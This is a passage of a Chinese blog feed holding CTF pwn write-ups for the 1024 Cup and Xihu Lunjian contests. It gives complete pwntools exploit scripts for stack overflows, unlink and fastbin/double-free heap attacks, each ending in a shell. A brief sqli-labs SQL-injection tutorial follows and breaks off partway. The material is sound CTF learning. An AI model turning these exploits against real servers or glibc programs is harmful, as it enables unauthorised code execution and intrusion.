<p><a href="https://www.cnblogs.com/gm-201705/p/9901555.html" target="_blank" rel="noopener external nofollow noreferrer">https://www.cnblogs.com/gm-201705/p/9901555.html</a></p>
]]></content>
      <categories>
        <category>pwn</category>
        <category>ret2_dl_runtime_resolve</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ELF文件动态链接</tag>
        <tag>ret2_dl_runtime_resolve</tag>
      </tags>
  </entry>
  <entry>
    <title>1024杯</title>
    <url>/2020/10/26/1024%E6%9D%AF/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/10/24/uOlHSPsZVTkRKrU.jpg" alt="5f87fd071a777.jpg"></p>
<a id="more"></a>

<h3 id="1024-happy-stack"><a href="#1024-happy-stack" class="headerlink" title="1024_happy_stack"></a>1024_happy_stack</h3><p>发现程序存在gets函数，<code>&#39;36D&#39;+&#39;\x00&#39;</code>绕过strcmp，然后溢出覆盖返回地址，首先泄露libc，然后同样得方法，利用one_gadget来getshell。一开始用system函数，发现一直出错，最后直接不管了，one_gadget一把梭。提交完群里师傅说可以多加一个ret，进行栈对齐，学到了，学到了。</p>
<h4 id="exp如下："><a href="#exp如下：" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;pwn1&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;111.231.70.44&#39;,28018)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;pwn1&#39;)</span><br><span class="line">libc&#x3D;ELF(&#39;.&#x2F;libc6_2.27-3ubuntu1_amd64.so&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">puts_plt &#x3D; elf.plt[&#39;puts&#39;]</span><br><span class="line">puts_got&#x3D;elf.got[&#39;puts&#39;]</span><br><span class="line">main_addr &#x3D; 0x00000000004005A0</span><br><span class="line">pop_rdi_ret&#x3D;0x0000000000400803</span><br><span class="line">pop_rsi_r15_ret&#x3D;0x0000000000400801</span><br><span class="line">payload &#x3D;&#39;36D&#39;+&#39;\x00&#39;+&#39;a&#39;*0x384</span><br><span class="line">payload+&#x3D;p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(&#39;36D\n&#39;)</span><br><span class="line">puts_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">sh.success(&#39;puts_addr : &#39; +hex(puts_addr))</span><br><span class="line">libc_base &#x3D; puts_addr-libc.symbols[&#39;puts&#39;]</span><br><span class="line">sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br><span class="line">one_gadget&#x3D;libc_base+0x4f2c5</span><br><span class="line"></span><br><span class="line">payload &#x3D;&#39;36D&#39;+&#39;\x00&#39;+&#39;\x00&#39;*0x384</span><br><span class="line">payload+&#x3D;p64(one_gadget)</span><br><span class="line"></span><br><span class="line">sleep(0.5)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="1024-happy-checkin"><a href="#1024-happy-checkin" class="headerlink" title="1024_happy_checkin"></a>1024_happy_checkin</h3><p>和第一个题一样，one_gadget一把梭。</p>
<h4 id="exp如下：-1"><a href="#exp如下：-1" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;pwn2&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;111.231.70.44&#39;,28028)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;pwn2&#39;)</span><br><span class="line">libc&#x3D;ELF(&#39;.&#x2F;libc6_2.27-3ubuntu1_amd64.so&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">puts_plt &#x3D; elf.plt[&#39;puts&#39;]</span><br><span class="line">puts_got&#x3D;elf.got[&#39;puts&#39;]</span><br><span class="line">main_addr &#x3D; 0x00000000004005F7 </span><br><span class="line">pop_rdi_ret&#x3D;0x00000000004006e3</span><br><span class="line"></span><br><span class="line">payload &#x3D;&#39;a&#39;*0x370+&#39;b&#39;*0x8</span><br><span class="line">payload+&#x3D;p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(&#39;b&#39;*8)</span><br><span class="line">puts_addr&#x3D;u64(sh.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))</span><br><span class="line">sh.success(&#39;puts_addr : &#39; +hex(puts_addr))</span><br><span class="line">libc_base&#x3D;puts_addr-libc.symbols[&#39;puts&#39;]</span><br><span class="line">one_gadget&#x3D;libc_base+0x4f2c5</span><br><span class="line"></span><br><span class="line">payload &#x3D;&#39;a&#39;*0x370+&#39;a&#39;*8</span><br><span class="line">payload+&#x3D;p64(one_gadget)</span><br><span class="line"></span><br><span class="line">sleep(0.5)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="1024-happy-unlink"><a href="#1024-happy-unlink" class="headerlink" title="1024_happy_unlink"></a>1024_happy_unlink</h3><p>程序存在off by one 漏洞，伪造fake_chunk，触发unlink，然后修改chunk_ptr为got地址，通过show函数泄露libc，修改free_got为system_addr，再次free就会getshell。需要注意得是，在做题的时候，我用题目给得libc，远程一直打不通，最后根据泄露得got地址，网上查了相应libc才得以打通，感觉是不是libc有问题。。。。</p>
<h4 id="exp如下：-2"><a href="#exp如下：-2" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;pwn3&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;111.231.70.44&#39;,28048)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;pwn3&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">#libc&#x3D;ELF(&#39;.&#x2F;libc.so.6&#39;)</span><br><span class="line"></span><br><span class="line">def add(index,size):</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(&#39;1&#39;)</span><br><span class="line">	sh.recvuntil(&#39;idx: &#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(&#39;2&#39;)</span><br><span class="line">	sh.recvuntil(&#39;idx: &#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(&#39;3&#39;)</span><br><span class="line">	sh.recvuntil(&#39;idx: &#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(&#39;4&#39;)</span><br><span class="line">	sh.recvuntil(&#39;idx: &#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.send(content)</span><br><span class="line"></span><br><span class="line">chunk_ptr&#x3D;0x6020f0</span><br><span class="line">fd&#x3D;chunk_ptr-0x18</span><br><span class="line">bk&#x3D;chunk_ptr-0x10</span><br><span class="line">free_got&#x3D;elf.got[&#39;free&#39;]</span><br><span class="line">puts_got&#x3D;elf.got[&#39;puts&#39;]</span><br><span class="line">puts_plt&#x3D;elf.plt[&#39;puts&#39;]</span><br><span class="line"></span><br><span class="line">add(0,0x60) </span><br><span class="line">add(1,0x88) </span><br><span class="line">add(2,0x80) </span><br><span class="line">add(3,&#39;&#x2F;bin&#x2F;sh\x00&#39;)</span><br><span class="line">edit(1,p64(0)+p64(0x81)+p64(fd)+p64(bk)+&#39;a&#39;*0x60+p64(0x80)+&#39;\x90&#39;)</span><br><span class="line">free(2)</span><br><span class="line">edit(1,&#39;a&#39;*0x8+p64(free_got)+p64(puts_got))</span><br><span class="line">show(0)</span><br><span class="line">free_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">sh.success(&#39;free_addr : &#39; +hex(free_addr))</span><br><span class="line"></span><br><span class="line">libc_base&#x3D;free_addr-0x0844f0</span><br><span class="line">sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br><span class="line">system_addr&#x3D;libc_base+0x045390</span><br><span class="line">sh.success(&#39;system_addr : &#39; +hex(system_addr))</span><br><span class="line"></span><br><span class="line">edit(0,p64(system_addr))</span><br><span class="line">edit(3,&#39;&#x2F;bin&#x2F;sh\x00&#39;)</span><br><span class="line">free(3)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>这里我还用了另一种方法，非预期？？？</p>
<p>通过off by one 漏洞修改 chunk_size，照成堆重叠，然后泄露libc，之后将chunk申请到malloc_hook，利用one_gadget来getshell。</p>
<h4 id="exp如下：-3"><a href="#exp如下：-3" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;pwn3&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;111.231.70.44&#39;,28016)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;pwn3&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">libc&#x3D;ELF(&#39;.&#x2F;libc6_2.23-0ubuntu10_amd64.so&#39;)</span><br><span class="line"></span><br><span class="line">def add(index,size):</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(&#39;1&#39;)</span><br><span class="line">	sh.recvuntil(&#39;idx: &#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(&#39;2&#39;)</span><br><span class="line">	sh.recvuntil(&#39;idx: &#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(&#39;3&#39;)</span><br><span class="line">	sh.recvuntil(&#39;idx: &#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(&#39;4&#39;)</span><br><span class="line">	sh.recvuntil(&#39;idx: &#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.send(content)</span><br><span class="line"></span><br><span class="line">add(0,0x18)</span><br><span class="line">add(1,0x60)</span><br><span class="line">add(2,0x60)</span><br><span class="line">add(3,0x10)</span><br><span class="line">edit(0,&#39;a&#39;*0x18+&#39;\xe1&#39;)</span><br><span class="line">free(1)</span><br><span class="line">add(4,0x60)</span><br><span class="line">show(2)</span><br><span class="line">main_arena&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))-88</span><br><span class="line">sh.success(&#39;main_arena : &#39; +hex(main_arena))</span><br><span class="line">libc_base&#x3D;main_arena-0x3c4b20</span><br><span class="line">sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br><span class="line">malloc_hook&#x3D;libc_base+libc.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">sh.success(&#39;malloc_hook : &#39; +hex(malloc_hook))</span><br><span class="line">one_gadget&#x3D;libc_base+0xf1147</span><br><span class="line">realloc&#x3D;libc_base+libc.symbols[&#39;realloc&#39;]</span><br><span class="line"></span><br><span class="line">add(5,0x60)</span><br><span class="line">free(5)</span><br><span class="line">edit(2,p64(malloc_hook-0x23))</span><br><span class="line">add(6,0x60)</span><br><span class="line">add(7,0x60)</span><br><span class="line">edit(7,&#39;a&#39;*3+p64(0)*2+p64(one_gadget))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;: &#39;)</span><br><span class="line">sh.sendline(&#39;1&#39;)</span><br><span class="line">sh.recvuntil(&#39;idx: &#39;)</span><br><span class="line">sh.sendline(str(1))</span><br><span class="line">sh.recvuntil(&#39;: &#39;)</span><br><span class="line">sh.sendline(str(0x20))</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>1024杯</tag>
      </tags>
  </entry>
  <entry>
    <title>西湖论剑</title>
    <url>/2020/10/11/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/10/10/uJTw96sBNRYSmgy.jpg" alt="5f80205552d10.jpg"></p>
<a id="more"></a>

<h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>这里我赛后看了其他师傅的wp，用了俩种方法进行复现。</p>
<h4 id="checksec检查："><a href="#checksec检查：" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>



<h4 id="利用-第一种方法-："><a href="#利用-第一种方法-：" class="headerlink" title="利用(第一种方法)："></a>利用(第一种方法)：</h4><ol>
<li>程序中存在double free漏洞，还给了栈地址。考虑首先将堆申请到栈上控制返回地址，泄露libc</li>
<li>然后再通过再将one_gadget写到malloc_hook上，发现不行，尝试进行realloc_hook抬高栈。</li>
<li>最后连续free俩次，触发double free 检测。double free检测会调用malloc。</li>
</ol>
<h4 id="exp如下："><a href="#exp如下：" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python </span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;mmutag&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;mmutag&#39;)</span><br><span class="line">libc&#x3D;ELF(&#39;.&#x2F;libc.so.6&#39;)</span><br><span class="line">#context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line"></span><br><span class="line">puts_plt&#x3D;elf.plt[&#39;puts&#39;]</span><br><span class="line">puts_got&#x3D;elf.got[&#39;puts&#39;]</span><br><span class="line">read_plt&#x3D;elf.plt[&#39;read&#39;]</span><br><span class="line">pop_ret&#x3D;0x0000000000400d23</span><br><span class="line"></span><br><span class="line">def welcome(introduce):</span><br><span class="line">	sh.recvuntil(&#39;please input your choice:\n&#39;)</span><br><span class="line">	sh.sendline(&#39;1&#39;)</span><br><span class="line">	sh.recvuntil(&#39;please input your introduce \n&#39;)</span><br><span class="line">	sh.sendline(introduce)</span><br><span class="line"></span><br><span class="line">def yourself():</span><br><span class="line">	sh.recvuntil(&#39;please input your choice:\n&#39;)</span><br><span class="line">	sh.sendline(&#39;2&#39;)</span><br><span class="line"></span><br><span class="line">def add(index,content):</span><br><span class="line">	sh.recvuntil(&#39;please input your choise:\n&#39;)</span><br><span class="line">	sh.sendline(&#39;1&#39;)</span><br><span class="line">	sh.recvuntil(&#39;please input your id:\n&#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">	sh.recvuntil(&#39;input your content\n&#39;)</span><br><span class="line">	sh.send(content)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">	sh.recvuntil(&#39;please input your choise:\n&#39;)</span><br><span class="line">	sh.sendline(&#39;2&#39;)</span><br><span class="line">	sh.recvuntil(&#39;please input your id:\n&#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def canary():</span><br><span class="line">        sh.recvuntil(&#39;please input your choise:\n&#39;)</span><br><span class="line">        sh.sendline(&#39;3&#39;)</span><br><span class="line">        sh.send(&#39;a&#39;*23+&#39;b&#39;+&#39;a&#39;)</span><br><span class="line">        sh.recvuntil(&#39;b&#39;)</span><br><span class="line">        canary&#x3D;u64(sh.recv(8))-0x61</span><br><span class="line">        sh.success(&#39;canary : &#39; +hex(canary))</span><br><span class="line">	return canary</span><br><span class="line"></span><br><span class="line">def fakechunk():</span><br><span class="line">    sh.recvuntil(&#39;please input your choise:\n&#39;)</span><br><span class="line">    sh.sendline(&#39;3&#39;)</span><br><span class="line">    sh.sendline(p64(0)+p64(0x71)+p64(0)+&#39;\x00&#39;)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;please input you name: \n&#39;)</span><br><span class="line">sh.sendline(&#39;aaaaaaaa&#39;)</span><br><span class="line">sh.recvuntil(&#39;this is your tag: &#39;)</span><br><span class="line">stack_buf_addr&#x3D;int(sh.recv(14),16) </span><br><span class="line"></span><br><span class="line">print &#39;stack_buf_addr : &#39;,hex(stack_buf_addr)</span><br><span class="line">stack_addr &#x3D; stack_buf_addr - 0x40</span><br><span class="line">sh.success(&#39;stack_addr : &#39; +hex(stack_addr))</span><br><span class="line"></span><br><span class="line">welcome(&#39;aaaaaa&#39;)</span><br><span class="line">yourself()</span><br><span class="line">add(1,&#39;aaaaaa&#39;)</span><br><span class="line">add(2,&#39;bbbbbb&#39;)</span><br><span class="line">free(1)</span><br><span class="line">free(2)</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">canary&#x3D;canary()</span><br><span class="line">fakechunk()</span><br><span class="line"></span><br><span class="line">main_addr&#x3D;0x0000000000400BF1 </span><br><span class="line">add(3,p64(stack_addr))</span><br><span class="line">add(4,&#39;a&#39;*8)</span><br><span class="line">add(5,&#39;a&#39;*8)</span><br><span class="line">add(6,&#39;a&#39;*8+p64(canary)+p64(0)+p64(pop_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;please input your choise:\n&#39;)</span><br><span class="line">sh.sendline(&#39;4&#39;)</span><br><span class="line">puts_addr &#x3D; u64(sh.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))</span><br><span class="line">sh.success(&#39;puts_addr : &#39; +hex(puts_addr))</span><br><span class="line">libc_base&#x3D;puts_addr-libc.symbols[&#39;puts&#39;]</span><br><span class="line">sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br><span class="line">malloc_hook&#x3D;libc_base+libc.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">sh.success(&#39;malloc_hook : &#39; +hex(malloc_hook))</span><br><span class="line">one_gadget&#x3D;libc_base + 0x4527A</span><br><span class="line">sh.success(&#39;one_gadget : &#39; +hex(one_gadget))</span><br><span class="line">realloc&#x3D;libc_base+libc.symbols[&#39;realloc&#39;]</span><br><span class="line">sh.success(&#39;realloc : &#39; +hex(realloc))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;please input you name: \n&#39;)</span><br><span class="line">sh.sendline(&#39;aaaaaaaa&#39;)</span><br><span class="line">welcome(&#39;aaaaaa&#39;)</span><br><span class="line">yourself()</span><br><span class="line"></span><br><span class="line">free(1)</span><br><span class="line">free(2)</span><br><span class="line">free(1)</span><br><span class="line">add(7,p64(malloc_hook-0x23))</span><br><span class="line">add(8,&#39;a&#39;*8)</span><br><span class="line">add(9,&#39;b&#39;*8)</span><br><span class="line">add(10,&#39;a&#39;*3+&#39;b&#39;*8+p64(one_gadget)+p64(realloc+4))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">free(1)</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="利用-第二种方法-："><a href="#利用-第二种方法-：" class="headerlink" title="利用(第二种方法)："></a>利用(第二种方法)：</h4><ol>
<li>将堆申请到栈上，泄露libc</li>
<li>再次将堆申请到栈上，控制返回地址getshell</li>
</ol>
<h4 id="exp如下：-1"><a href="#exp如下：-1" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;mmutag&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;mmutag&#39;)</span><br><span class="line">libc&#x3D;ELF(&#39;.&#x2F;libc.so.6&#39;)</span><br><span class="line">#context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line"></span><br><span class="line">puts_plt&#x3D;elf.plt[&#39;puts&#39;]</span><br><span class="line">puts_got&#x3D;elf.got[&#39;puts&#39;]</span><br><span class="line">pop_ret&#x3D;0x0000000000400d23</span><br><span class="line"></span><br><span class="line">def welcome(introduce):</span><br><span class="line">	sh.recvuntil(&#39;please input your choice:\n&#39;)</span><br><span class="line">	sh.sendline(&#39;1&#39;)</span><br><span class="line">	sh.recvuntil(&#39;please input your introduce \n&#39;)</span><br><span class="line">	sh.sendline(introduce)</span><br><span class="line"></span><br><span class="line">def yourself():</span><br><span class="line">	sh.recvuntil(&#39;please input your choice:\n&#39;)</span><br><span class="line">	sh.sendline(&#39;2&#39;)</span><br><span class="line"></span><br><span class="line">def add(index,content):</span><br><span class="line">	sh.recvuntil(&#39;please input your choise:\n&#39;)</span><br><span class="line">	sh.sendline(&#39;1&#39;)</span><br><span class="line">	sh.recvuntil(&#39;please input your id:\n&#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">	sh.recvuntil(&#39;input your content\n&#39;)</span><br><span class="line">	sh.send(content)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">	sh.recvuntil(&#39;please input your choise:\n&#39;)</span><br><span class="line">	sh.sendline(&#39;2&#39;)</span><br><span class="line">	sh.recvuntil(&#39;please input your id:\n&#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def canary():</span><br><span class="line">        sh.recvuntil(&#39;please input your choise:\n&#39;)</span><br><span class="line">        sh.sendline(&#39;3&#39;)</span><br><span class="line">        sh.send(&#39;a&#39;*23+&#39;b&#39;+&#39;a&#39;)</span><br><span class="line">        sh.recvuntil(&#39;b&#39;)</span><br><span class="line">        canary&#x3D;u64(sh.recv(8))-0x61</span><br><span class="line">        sh.success(&#39;canary : &#39; +hex(canary))</span><br><span class="line">	return canary</span><br><span class="line"></span><br><span class="line">def fakechunk():</span><br><span class="line">    sh.recvuntil(&#39;please input your choise:\n&#39;)</span><br><span class="line">    sh.sendline(&#39;3&#39;)</span><br><span class="line">    sh.sendline(p64(0)+p64(0x71)+p64(0)+&#39;\x00&#39;)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;please input you name: \n&#39;)</span><br><span class="line">sh.sendline(&#39;aaaaaaaa&#39;)</span><br><span class="line">sh.recvuntil(&#39;this is your tag: &#39;)</span><br><span class="line">stack_buf_addr&#x3D;int(sh.recv(14),16) </span><br><span class="line"></span><br><span class="line">print &#39;stack_buf_addr : &#39;,hex(stack_buf_addr)</span><br><span class="line">stack_addr &#x3D; stack_buf_addr - 0x40</span><br><span class="line">sh.success(&#39;stack_addr : &#39; +hex(stack_addr))</span><br><span class="line"></span><br><span class="line">welcome(&#39;aaaaaa&#39;)</span><br><span class="line">yourself()</span><br><span class="line">add(1,&#39;aaaaaa&#39;)</span><br><span class="line">add(2,&#39;bbbbbb&#39;)</span><br><span class="line">free(1)</span><br><span class="line">free(2)</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">canary&#x3D;canary()</span><br><span class="line">fakechunk()</span><br><span class="line"></span><br><span class="line">main_addr&#x3D;0x0000000000400BF1 </span><br><span class="line">add(3,p64(stack_addr))</span><br><span class="line">add(4,&#39;a&#39;*8)</span><br><span class="line">add(5,&#39;a&#39;*8)</span><br><span class="line">add(6,&#39;a&#39;*8+p64(canary)+p64(0)+p64(pop_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;please input your choise:\n&#39;)</span><br><span class="line">sh.sendline(&#39;4&#39;)</span><br><span class="line">puts_addr &#x3D; u64(sh.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))</span><br><span class="line">sh.success(&#39;puts_addr : &#39; +hex(puts_addr))</span><br><span class="line">libc_base&#x3D;puts_addr-libc.symbols[&#39;puts&#39;]</span><br><span class="line">sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br><span class="line">system_addr&#x3D;libc_base+libc.symbols[&#39;system&#39;]</span><br><span class="line">sh.success(&#39;system_addr : &#39; +hex(system_addr))</span><br><span class="line">bin_sh_addr&#x3D;libc_base+0x18ce17</span><br><span class="line">sh.success(&#39;bin_sh_addr : &#39; +hex(bin_sh_addr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;please input you name: \n&#39;)</span><br><span class="line">sh.sendline(&#39;aaaaaaaa&#39;)</span><br><span class="line">welcome(&#39;aaaaaa&#39;)</span><br><span class="line">yourself()</span><br><span class="line"></span><br><span class="line">fakechunk()</span><br><span class="line">free(1)</span><br><span class="line">free(2)</span><br><span class="line">free(1)</span><br><span class="line">add(7,p64(stack_addr-0x10))</span><br><span class="line">add(8,&#39;a&#39;*8)</span><br><span class="line">add(9,&#39;b&#39;*8)</span><br><span class="line">add(10,p64(0)+p64(canary)+p64(0)+p64(pop_ret)+p64(bin_sh_addr)+p64(system_addr)+p64(main_addr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;please input your choise:\n&#39;)</span><br><span class="line">sh.sendline(&#39;4&#39;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>剩下题目有时间在复现。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>西湖论剑</tag>
      </tags>
  </entry>
  <entry>
    <title>GET基于报错的sql注入</title>
    <url>/2020/10/06/GET%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E7%9A%84sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/10/05/P5uQn2rkzWfaZ3q.jpg" alt="5f69af32b943b.jpg"></p>
<a id="more"></a>

<h3 id="sql注入分类"><a href="#sql注入分类" class="headerlink" title="sql注入分类"></a>sql注入分类</h3><p>数字型和字符型</p>
<h3 id="GET基于报错的sql注入"><a href="#GET基于报错的sql注入" class="headerlink" title="GET基于报错的sql注入"></a>GET基于报错的sql注入</h3><p>通过再URL中修改对应的ID值，为正常数字，大数字，字符(单引号，双引号，括号),反斜杠\来探测URL中是否存在注入点</p>
<p>这里我以sqli-labs中的题为例：</p>
<h4 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h4><p>这里我再URL中输入<code>?id=1</code>来进行id传参，?不想我们以前写的<code>index.php?id=1</code>是因为如果不写前面的就表示默认页面或者index.php。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:Dumb</span><br></pre></td></tr></table></figure>

<p>我们再输入<code>?id=1&#39;</code>返回sql错误</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>

<p>返回<code>&#39;&#39;1&#39;&#39; LIMIT 0,1&#39;</code>，去掉最外面俩个单引号<code>&#39;1&#39;&#39; LIMIT 0,1&#39;</code>，</p>
<p>我们猜测其真正的SQL语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select login_name,password from admin where id&#x3D;&#39;id&#39; LIMIT 0,1</span><br></pre></td></tr></table></figure>

<h4 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h4><p>我们输入<code>?id=1</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:Dumb</span><br></pre></td></tr></table></figure>

<p>我们再输入<code>?id=1&#39;</code>返回sql错误</p>
